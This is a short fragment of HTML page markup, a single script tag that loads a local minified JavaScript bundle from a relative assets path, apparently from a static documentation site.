     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
